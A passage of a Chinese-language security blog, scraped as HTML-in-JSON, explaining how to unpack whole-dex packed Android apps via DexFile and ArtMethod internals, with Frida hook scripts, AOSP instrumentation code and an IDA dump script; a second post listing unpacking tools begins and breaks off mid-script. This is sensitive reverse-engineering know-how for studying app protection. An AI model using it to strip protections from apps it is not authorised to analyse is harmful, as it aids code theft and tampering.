code_item,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ShadowFrame&amp; shadow_frame,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    JValue result_register,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">bool</span> stay_in_interpreter = <span class=\"literal\">false</span>)</span> <span class=\"title\">REQUIRES_SHARED</span><span class=\"params\">(Locks::mutator_lock_)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">***************</span><br><span class=\"line\">      ArtMethod *method = shadow_frame.<span class=\"built_in\">GetMethod</span>();</span><br><span class=\"line\">***************</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里我们大致分析完成了类加载的思路</p>\n<h3 id=\"4-DexFile详解\"><a href=\"#4-DexFile详解\" class=\"headerlink\" title=\"4.DexFile详解\"></a>4.DexFile详解</h3><p>前面我们分析了很多，对dex加载、类加载等都已经有了一个很详细的了解，而最终一切的核心就是DexFile，DexFile就是我们脱壳所关注的重点，寒冰大佬在<a href=\"https://bbs.pediy.com/thread-254555.htm#msg_header_h2_2\">拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点</a>中提到，在ART下只要获得了DexFile对象，那么我们就可以得到该dex文件在内存中的起始地址和大小，进而完成脱壳。</p>\n<p>我们先查看一些DexFile的结构体</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/48.png\" alt=\"image-20220613152305983\"></p>\n<p>只要我们能获得起始地址begin和大小size，就可以成功的将dex文件脱取下来，这里我们记得DexFile含有虚函数表，所以根据C++布局，要偏移一个指针</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/49.png\" alt=\"image-20220613152517629\"></p>\n<p>而DexFile类还给我们提供了方便的API</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/50.png\" alt=\"image-20220613152724888\"></p>\n<p>这样只要我们找到函数中有DexFile对象，就可以通过调用API来进一步dump dex文件，由此按照寒冰大佬的思想，大量的脱壳点由此产生</p>\n<h4 id=\"（1）直接查找法\"><a href=\"#（1）直接查找法\" class=\"headerlink\" title=\"（1）直接查找法\"></a>（1）直接查找法</h4><p>我们通过直接在Android源码中搜索DexFile，就可以获得海量的脱壳点</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/51.png\" alt=\"image-20220613153036103\"></p>\n<p>我们通过在IDA中搜索libart.so导出的DexFile，同样可以获得大量的脱壳点</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/52.png\" alt=\"image-20220613153220786\"></p>\n<h4 id=\"（2）间接查找法\"><a href=\"#（2）间接查找法\" class=\"headerlink\" title=\"（2）间接查找法\"></a>（2）间接查找法</h4><p>这里就是寒冰大佬在文章中提到的通过ArtMethod对象的getDexFile()获取到ArtMethod所属的DexFile对象的这种一级间接法，通过Thread的getCurrentMethod()函数首先获取到ArtMethod或者通过ShadowFrame的getMethod获取到ArtMethod对象，然后再通过getDexFile获取到ArtMethod对象所属的DexFile的二级间接法。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">getDexFile()</span><br><span class=\"line\">getMethod()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-ArtMethod详解\"><a href=\"#5-ArtMethod详解\" class=\"headerlink\" title=\"5.ArtMethod详解\"></a>5.ArtMethod详解</h3><p>上面我们已经详细分析了DexFile的文件结构，我们知道通过ArtMethod可以获得DexFile，那么为啥又要单独提ArtMethod呢，因为ArtMethod在抽取壳和VMP等壳中扮演了重要的角色</p>\n<p>ArtMethod结构体</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/53.png\" alt=\"image-20220613154044296\"></p>\n<p>我们通过ArtMethod可以获得codeitem的偏移和方法索引，熟悉dex结构的朋友知道codeitem就是代码实际的值，而codeitem则再后续加壳技术扮演了至关重要的地址，而且ArtMethod还有非常丰富的方法，可以帮助大家实现很多功能，所以在脱壳工作中也是十分重要的</p>\n<h2 id=\"五、脱壳技术归纳\"><a href=\"#五、脱壳技术归纳\" class=\"headerlink\" title=\"五、脱壳技术归纳\"></a>五、脱壳技术归纳</h2><p>前面分析了很多，最后无非整体加壳的脱壳方案落脚在DexFile的关键对象上，由此产生了一些常用的方法</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/54.png\" alt=\"image-20220613154906679\"></p>\n<h3 id=\"1-现有工具脱壳法\"><a href=\"#1-现有工具脱壳法\" class=\"headerlink\" title=\"1.现有工具脱壳法\"></a>1.现有工具脱壳法</h3><p>工欲善其事必先利其器，整体加壳已经很多年，不少的大佬们都开发了很多非常好用的工具，我们在自己掌握原理过程时，平时工作中也可以使用很多大佬的开发工具，这里随便举几个自己经常用的工具，这里我对各个大佬的脱壳工具进行了一个梳理</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/55.png\" alt=\"image-20220613154906679\"></p>\n<h4 id=\"（1）FRIDA-DEXDump\"><a href=\"#（1）FRIDA-DEXDump\" class=\"headerlink\" title=\"（1）FRIDA-DEXDump\"></a>（1）FRIDA-DEXDump</h4><p>这是葫芦娃大佬开发的针对整体加壳的工具，主要通过frida技术，文章参考：<a href=\"https://www.anquanke.com/post/id/221905\">深入 FRIDA-DEXDump 中的矛与盾</a>，该工具的特点是一般的hook方案通过直接搜索DEX的头文件dex.035来定位dex的起始地址，但是后来不少公司对头文件的魔术字段进行了抹除，这样针对没有文件头的 <code>DEX</code> 文件，该工具通过map_off 找到 DEX 的 map_list， 通过解析它，并得到类型为 TYPE_MAP_LIST 的条目计算出文件的大小和起始地址，也很好的提供了一种解决思路。</p>\n<p>使用方法：</p>\n<p>FRIDA-DEXDump使用十分的简单，详细参考github：<a href=\"https://github.com/hluwa/frida-dexdump\">FRIDA-DEXDump</a></p>\n<p>这里引用一张大佬星球的使用流程图，非常详细，快速进行脱壳</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/56.png\" alt=\"image-20220613161015961\"></p>\n<p>我们简单演示一下，这里结合objection一起使用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/99.png\" alt=\"image-20220613224143108\"></p>\n<p>然后再次打开脱下来的dex，即可 </p>\n<h4 id=\"（2）FDex2\"><a href=\"#（2）FDex2\" class=\"headerlink\" title=\"（2）FDex2\"></a>（2）FDex2</h4><p>Fdex2主要是利用Android7.0及版本以下的特殊API <code>getDex()</code>来进行脱壳，原本是基于Xposed的模块，不过掌握原理后，大家可以使用各种Hook框架去实现,参考链接：<a href=\"https://bbs.pediy.com/thread-224105.htm\">安卓xposed脱壳工具FDex2 </a></p>\n<h4 id=\"（3）其他工具\"><a href=\"#（3）其他工具\" class=\"headerlink\" title=\"（3）其他工具\"></a>（3）其他工具</h4><p>针对整体壳的脱壳工具有很多，无非是针对各种脱壳点再采用不同的方法，其原理是殊途同归，而基于源码定制的Fart、youpk等等针对整体加壳壳都可以基本实现完全的脱壳，而且抽取壳也有着很好的效果，下面我们就依次来讲述具体的脱壳方法原理，各种脱壳工具如下图所示：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/57.png\" alt=\"image-20220613162509955\"></p>\n<h3 id=\"2-Hook脱壳法\"><a href=\"#2-Hook脱壳法\" class=\"headerlink\" title=\"2.Hook脱壳法\"></a>2.Hook脱壳法</h3><p>我们前面知道了，只要函数中包含DexFile对象，我们就可以通过Hook技术拿到对象，然后取到begin和size，从而进行脱壳，市面上使用较多的无非是Xposed和frida，我平时使用frida较为方便，这里也用frida和大家演示：</p>\n<p>首先我们使用GDA识别加壳程序</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/58.png\" alt=\"image-20220613164418413\"></p>\n<p>很明显是进行了整体加壳，有没其他加壳暂时不知道，我们先进行脱壳</p>\n<p>找到脱壳点</p>\n<p>通过IDA打开<code>libart.so</code>，搜索DexFile，我们可以找到海量的脱壳点</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/59.png\" alt=\"image-20220613164747966\"></p>\n<p>我们就随便找一个包含DexFile的脱壳函数，然后记录符号值</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/60.png\" alt=\"image-20220613164841377\"></p>\n<p>然后我们编写hook脚本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/62.png\" alt=\"image-20220613172003659\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里之所以获取begin加上一个指针，是因为我们前面讲了dexfile含有一个虚函数地址，所以加上一个指针偏移</span><br></pre></td></tr></table></figure>\n\n<p>然后启动frida_server</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/61.png\" alt=\"image-20220613170608657\"></p>\n<p>附加进程进行dump，这里我们存在sdcard下面，所以需要提前赋予sdcard权限</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/63.png\" alt=\"image-20220613172109177\"></p>\n<p>这里就脱壳成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/64.png\" alt=\"image-20220613172222202\"></p>\n<p>然后我们打开相应的dex</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/65.png\" alt=\"image-20220613172222202\"></p>\n<p>此时说明我们整体脱壳成功，不过应用还有抽取壳，这个不是本文解决的内容</p>\n<h3 id=\"3-插桩脱壳法\"><a href=\"#3-插桩脱壳法\" class=\"headerlink\" title=\"3.插桩脱壳法\"></a>3.插桩脱壳法</h3><p>插桩脱壳法，就是在Android源码里面定位到相应的脱壳点，然后插入相应的代码，重新编译源码生成系统镜像，最后就可以使用定制的系统进行脱壳</p>\n<p>我们在<a href=\"https://bbs.pediy.com/thread-269575.htm\">源码编译（1）——Android6.0源码编译详解</a>中已经讲述了如何编译源码，接下来我们进行插桩脱壳</p>\n<p>同理、还是定位脱壳点，我们还是随便定位一个脱壳点LoadMethod 然后进行插桩</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/98.png\" alt=\"image-20220613220518548\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//add</span></span><br><span class=\"line\"><span class=\"type\">char</span> dexfilepath[<span class=\"number\">100</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(dexfilepath,<span class=\"number\">0</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"built_in\">sprintf</span>(dexfilepath,<span class=\"string\">&quot;%d_%zu_LoadMethod.dex&quot;</span>,<span class=\"built_in\">getpid</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\"><span class=\"type\">int</span> dexfd = <span class=\"built_in\">open</span>(dexfilepathm,O_CREAT|O_RDWR,<span class=\"number\">666</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(dexfd&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> result = <span class=\"built_in\">write</span>(dexfd,dex_file.<span class=\"built_in\">Begin</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(result&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">close</span>(dexfd);</span><br><span class=\"line\">\t\t<span class=\"built_in\">LOG</span>(WARNING)&lt;&lt;<span class=\"string\">&quot;LoadMethod&quot;</span>&lt;&lt;dexfilepath;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//add</span></span><br></pre></td></tr></table></figure>\n\n<p>同理我们在<code>execute</code>同样插桩此段代码，最后进行编译，编译成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/66.png\" alt=\"image-20220613172222202\"></p>\n<p>然后给程序授权sdcard权限，再次启动应用，就可以看见脱取的dex文件就保存在sdcard目录下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/97.png\" alt=\"image-20220613215956911\"></p>\n<p>再次将sdcard下dex文件打开，这里我们已经看见了8732435这个文件，再次打开脱取成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/65.png\" alt=\"image-20220613172222202\"></p>\n<h3 id=\"4-反射脱壳法\"><a href=\"#4-反射脱壳法\" class=\"headerlink\" title=\"4.反射脱壳法\"></a>4.反射脱壳法</h3><p>反射脱壳法的核心思想就是利用前面我们提到的mCooike值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">核心思路：反射 + mCookie</span><br><span class=\"line\">步骤：</span><br><span class=\"line\"><span class=\"number\">1</span>、找到加固apk的任一class，一般选择主Application或Activity</span><br><span class=\"line\"><span class=\"number\">2</span>、通过该类找到对应的Classloader</span><br><span class=\"line\"><span class=\"number\">3</span>、通过该Classloader找到BaseDexClassLoader</span><br><span class=\"line\"><span class=\"number\">4</span>、通过BaseDexClassLoader找到其字段DexPathList</span><br><span class=\"line\"><span class=\"number\">5</span>、通过DexPathList找到其变量Element数组dexElements</span><br><span class=\"line\"><span class=\"number\">6</span>、迭代该数组，该数组内部包含DexFile结构</span><br><span class=\"line\"><span class=\"number\">7</span>、通过DexFile获取其变量mCookie和mFileName</span><br><span class=\"line\"> </span><br><span class=\"line\">至此我们已经获取了mCookie</span><br><span class=\"line\"> </span><br><span class=\"line\">对该mCookie的解释:</span><br><span class=\"line\">#<span class=\"number\">1</span>、<span class=\"number\">4.4</span>以下好像，mCookie对应的是一个<span class=\"type\">int</span>值，该值是指向<span class=\"keyword\">native</span>层内存中的dexfile的指针</span><br><span class=\"line\">#<span class=\"number\">2</span>、<span class=\"number\">5.0</span>是一个<span class=\"type\">long</span>值，该值指向<span class=\"keyword\">native</span>层std::vector&lt;const DexFile*&gt;* 指针，注意这里有多个dex，你需要找到你要的</span><br><span class=\"line\">#<span class=\"number\">3</span>、<span class=\"number\">8.0</span>，该值也是一个<span class=\"type\">long</span>型的值，指向底层vector，但是vector下标<span class=\"number\">0</span>是oat文件，从<span class=\"number\">1</span>开始是dex文件</span><br><span class=\"line\"><span class=\"comment\">// 至于你手机是那个版本，如果没有落入我上面描述的，你需要自己看看代码</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">8</span>、根据mCookie对应的值做转换，最终你能找到dexfile内存指针</span><br><span class=\"line\"><span class=\"number\">9</span>、把该指针转换为dexfile结构，通过findClassDef来匹配你所寻找的dex是你要的dex</span><br><span class=\"line\"><span class=\"number\">10</span>、dump写文件</span><br></pre></td></tr></table></figure>\n\n<p>综述mCookie是在native层就是dexfile的指针，我们利用反射原理来获取mCookie，从而就可以进行脱壳了，这里我们同样使用frida演示：</p>\n<p>编写hook代码</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/67.png\" alt=\"image-20220613190231102\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/68.png\" alt=\"image-20220613190303491\"></p>\n<p>我们看见了和上面同样大小的8841876_mCookie.dex</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/69.png\" alt=\"image-20220613190401266\"></p>\n<p>使用工具打开，发现同样脱壳成功</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/70.png\" alt=\"image-20220613190438224\"></p>\n<h3 id=\"5-动态调试脱壳法\"><a href=\"#5-动态调试脱壳法\" class=\"headerlink\" title=\"5.动态调试脱壳法\"></a>5.动态调试脱壳法</h3><p>所谓动态调试法，核心原理和上面一样，就是我们在动态调试的过程中找到DexFile的起始地址和大小，然后执行脚本进行dump</p>\n<p>首先选取脱壳点，我们还是选择<code>DexFile::DexFile</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/90.png\" alt=\"image-20220613210130186\"></p>\n<p>动态调试的步骤我在前面的文章中已经做了详细的讲解，不会的朋友去看前面的文章</p>\n<p>首先我们启动android_server</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/81.png\" alt=\"image-20220613194111711\"></p>\n<p>然后我们附加上进程</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/82.png\" alt=\"image-20220613194326114\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/83.png\" alt=\"image-20220613195349008\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/86.png\" alt=\"image-20220613203024990\"></p>\n<p>然后我们打开libart.so，并定位到DexFile::DexFile</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/91.png\" alt=\"image-20220613210859021\"></p>\n<p>然后在该函数下断点，然后F9过来</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/92.png\" alt=\"image-20220613211145356\"></p>\n<p>此处我们就可以很明显看到X1就是我们的起始地址，X4是我们的偏移值</p>\n<p>编写脚本进行hook</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span>&#123;    </span><br><span class=\"line\"> <span class=\"keyword\">auto</span> fp, begin, end, dexbyte;      </span><br><span class=\"line\"> fp = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;d:\\\\dump.dex&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>);      </span><br><span class=\"line\"> begin =  <span class=\"number\">0x76FCD93020</span>;    </span><br><span class=\"line\"> end = begin + <span class=\"number\">0x7EEC5600</span>; </span><br><span class=\"line\"> <span class=\"keyword\">for</span> ( dexbyte = begin; dexbyte&lt;end;dexbyte++)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">fputc</span>(<span class=\"built_in\">Byte</span>(dexbyte), fp);        </span><br><span class=\"line\"> &#125;   </span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/93.png\" alt=\"image-20220613214647627\"></p>\n<p>直接运行run</p>\n<p>然后我们查看dump.dex文件</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/94.png\" alt=\"image-20220613223330340\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/95.png\" alt=\"image-20220613215148251\"></p>\n<p>我们可以发现这里是代理类，还没有到我们想要的dex，我们再次F9，再次到这里，地址再次改变，再次结合长度来计算，我们每次计算可以取小点值，先试一下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/96.png\" alt=\"image-20220613215343895\"></p>\n<p>发现还是不是，我们需要不停测试直到dump出dex为此</p>\n<p>这里大家可以下去按照此方法尝试，或者换一个脱壳点来尝试</p>\n<h3 id=\"6-特殊API脱壳法\"><a href=\"#6-特殊API脱壳法\" class=\"headerlink\" title=\"6.特殊API脱壳法\"></a>6.特殊API脱壳法</h3><p>所谓特殊的API脱壳法就是通过Android自身提供的API来获得Dex，这主要是参考Fdex2，前面我们讲了Fdex2主要是利用Android7.0及以下提供了getDex()和getBytes()两个API，我们可以直接可以获得class对象，然后直接调用这两个API</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/71.png\" alt=\"image-20220613191047342\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/72.png\" alt=\"image-20220613191158377\"></p>\n<p>编写hook代码：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/74.png\" alt=\"image-20220613192251923\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.使用frida枚举所有Classloader </span><br><span class=\"line\">2.确定正确的ClassLoader并获取目标类的Class对象</span><br><span class=\"line\">3.通过Class对象获取得到dex对象</span><br><span class=\"line\">4.通过dex对象获取内存字节流并保存</span><br></pre></td></tr></table></figure>\n\n<p>然后我们查看程序的类对象，随便dump一个类对象</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/73.png\" alt=\"image-20220613191722932\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/75.png\" alt=\"image-20220613192447143\"></p>\n<p>然后我们再次用工具打开</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/76.png\" alt=\"image-20220613192548342\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/77.png\" alt=\"image-20220613192659791\"></p>\n<p>发现就可以成功的dump</p>\n<p>通过这种方式，我们发现神奇的事我们还可以抽取壳的情况，比如我们之前为空类</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/78.png\" alt=\"image-20220613192926853\"></p>\n<p>我们明显可以发现这里是采用了函数抽取的技术，一般的一代壳dump方案是无法解决抽取壳的，我们使用特殊API方法</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/79.png\" alt=\"image-20220613193028308\"></p>\n<p>再次打开，成功dump</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/80.png\" alt=\"image-20220613193102209\"></p>\n<p>这其实主要是抽取壳的一个回填时机的问题，这个详细放在以后抽取壳中讲解</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文总结了当下dex整体加壳的基本原理，和常用的一些脱壳方案，并一一进行复现，还有一些文件监控法等，由于我平时用的很少就没列举了，复现实验过程中由于涉及到不同的实验，所以我用了Android 6.0 Android 7.0 Android 8.0三台机器进行实验，所以大家可以注意下对应的方法和其Android版本，这里彻底解决了整体加壳的脱壳方案，到这里可以掌握脱壳、抓包、Hook、反Hook、反调、反签等基本手段，这样在进行Android App漏洞挖掘过程中将事半功倍。后面我将继续讲解Android App漏洞中的XSS漏洞、Sql注入漏洞、文件上传漏洞、端口扫描漏洞、WebView漏洞等。</p>\n<p>脱壳脚本相关样本会放在github，所有的脱壳脚本和工具和上传知识星球</p>\n<p>github：<a href=\"https://github.com/WindXaa\">github</a></p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-252630.htm#msg_header_h2_4</span><br><span class=\"line\">https://bbs.pediy.com/thread-254555.htm#msg_header_h2_4</span><br><span class=\"line\">https://www.anquanke.com/post/id/221905?display=mobile</span><br><span class=\"line\">https://www.qj301.com/news/317.html</span><br></pre></td></tr></table></figure>\n\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（4）—— 一代壳脱壳工具集","url":"/2022/12/04/Packer4/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>在前面的文章中我们已经讲述了Android加壳与脱壳的基本原理，也制作了简易的加壳机，本文主要分享一些网络上常使用的开源脱壳工具，这里收集并整理了，方便逆向工作者针对一代壳进行简易脱壳。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"二、工具介绍\"><a href=\"#二、工具介绍\" class=\"headerlink\" title=\"二、工具介绍\"></a>二、工具介绍</h2><h3 id=\"1-场景1\"><a href=\"#1-场景1\" class=\"headerlink\" title=\"1.场景1\"></a>1.场景1</h3><p>假设你手里有一台已经root过的测试机，但目前什么工具都没有安装，你想使用这部机器进行脱壳，你可以方便使用哪些工具呢？</p>\n<h4 id=\"1-1-Frida\"><a href=\"#1-1-Frida\" class=\"headerlink\" title=\"1.1 Frida\"></a>1.1 Frida</h4><p>你考虑使用frida，这里你可以考虑两种方案，第一自己写Frida脚本，看过我前面整体加壳和脱壳原理的，这里应该十分容易，这种方法更加具有灵活性，其次你可以使用网络上的开源框架，这里推荐使用网络上葫芦娃大佬的框架FRIDA-DEXDump</p>\n<h5 id=\"1-1-1-自定制脚本\"><a href=\"#1-1-1-自定制脚本\" class=\"headerlink\" title=\"1.1.1 自定制脚本\"></a>1.1.1 自定制脚本</h5><p>根据脱壳原理选择脱壳点，然后编写相应的hook脚本，然后通过frida进行hook上即可</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> savepath = <span class=\"string\">&quot;/sdcard/&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">savedexfile</span>(<span class=\"params\">dexfileptr</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//将mCookie转换为对应的dexfile内存指针</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dexfilebegin = <span class=\"title function_\">ptr</span>(dexfileptr).<span class=\"title function_\">add</span>(<span class=\"title class_\">Process</span>.<span class=\"property\">pointerSize</span>*<span class=\"number\">1</span>).<span class=\"title function_\">readPointer</span>(); <span class=\"comment\">//dex的初始指针</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dexfilesize = <span class=\"title function_\">ptr</span>(dexfileptr).<span class=\"title function_\">add</span>(<span class=\"title class_\">Process</span>.<span class=\"property\">pointerSize</span>*<span class=\"number\">2</span>).<span class=\"title function_\">readU32</span>(); <span class=\"comment\">//dex的大小</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> dex = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(savepath+<span class=\"string\">&quot;_&quot;</span>+dexfilesize+<span class=\"string\">&quot;.dex&quot;</span>,<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(dex!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> content = <span class=\"title function_\">ptr</span>(dexfilebegin).<span class=\"title function_\">readByteArray</span>(dexfilesize);</span><br><span class=\"line\">            dex.<span class=\"title function_\">write</span>(content);</span><br><span class=\"line\">            dex.<span class=\"title function_\">flush</span>();</span><br><span class=\"line\">            dex.<span class=\"title function_\">close</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">warn</span>(<span class=\"string\">&quot;[dumpdex]&quot;</span>+savepath+<span class=\"string\">&quot;_&quot;</span>+dexfilesize+<span class=\"string\">&quot;.dex&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">dumpDexBymCookie</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">var</span> <span class=\"title class_\">DexFileClass</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;dalvik.system.DexFile&quot;</span>);</span><br><span class=\"line\">       <span class=\"title class_\">Java</span>.<span class=\"title function_\">choose</span>(<span class=\"string\">&quot;dalvik.system.DexFile&quot;</span>,&#123;</span><br><span class=\"line\">           <span class=\"attr\">onMatch</span>:<span class=\"keyword\">function</span> (<span class=\"params\">dexfile</span>) &#123;</span><br><span class=\"line\">               <span class=\"keyword\">var</span> mCookie = dexfile.<span class=\"property\">mCookie</span>.<span class=\"property\">value</span>;</span><br><span class=\"line\">               <span class=\"comment\">//获取类列表和dex路径</span></span><br><span class=\"line\">            <span class=\"comment\">//    var classlist = DexFileClass.getClassNameList(mCookie);</span></span><br><span class=\"line\">            <span class=\"comment\">//    classlist.forEach(function (classname) &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//        console.log(dexfile.mFileName.value+&quot;-&gt;&quot;+classname);</span></span><br><span class=\"line\">            <span class=\"comment\">//    &#125;)</span></span><br><span class=\"line\">               <span class=\"comment\">//console.log(mCookie.$className);</span></span><br><span class=\"line\">               <span class=\"keyword\">var</span> <span class=\"title class_\">Array</span> = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class=\"line\">               <span class=\"keyword\">var</span> size = <span class=\"title class_\">Array</span>.<span class=\"title function_\">getLength</span>(mCookie);</span><br><span class=\"line\">               <span class=\"keyword\">var</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">               <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;size;i++)&#123;</span><br><span class=\"line\">                   <span class=\"comment\">//console.log(i+&quot;-&gt;&quot;+Array.getLong(mCookie,i));</span></span><br><span 